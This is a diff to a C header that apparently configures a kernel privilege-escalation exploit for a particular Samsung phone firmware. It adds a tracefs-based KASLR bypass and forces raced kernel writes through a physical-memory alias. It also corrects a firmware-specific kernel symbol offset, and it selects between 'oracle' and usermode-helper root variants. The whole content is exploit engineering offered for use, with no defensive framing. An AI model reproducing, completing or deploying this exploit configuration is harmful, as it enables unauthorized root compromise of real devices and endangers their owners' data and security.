@@ -13,9 +13,12 @@
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define BUILD_VARIANT_LABEL "pa2q-S936BXXUCZZI4-app-physical-p0-oracle"
 #define APP_PHYS_P0_ORACLE 1
-/* Physical-P0 oracle only: same pa2q/pa3q 6.6.127 behavior as the S25
- * Ultra target (tracefs-derived slides skip the oracle gate/probe writes
- * and the first raced write fails with window=0). */
+/* Deterministic tracefs KASLR route (shell has readtracefs). */
+#define APP_TRACEFS_SLIDE 1
+/* Data addressing MUST use the physical-load alias even when the slide came
+ * from tracefs: canonical direct-map writes never land on this kernel build
+ * (window=0 across boots) while phys-alias writes succeed. */
+#define APP_TRACEFS_PHYS_ALIAS_DATA 1
 #else
 #define BUILD_VARIANT_LABEL "pa2q-S936BXXUCZZI4-root-umh"
 #endif
@@ -125,7 +128,7 @@
 #define ROOT_UMH_WORK_OFF 0x6000
 #define ROOT_UMH_DATA_OFF 0x6200
 
-#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x0179166cULL
+#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x01791638ULL
 #define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02342080ULL
 #define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
 #define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x024785c8ULL
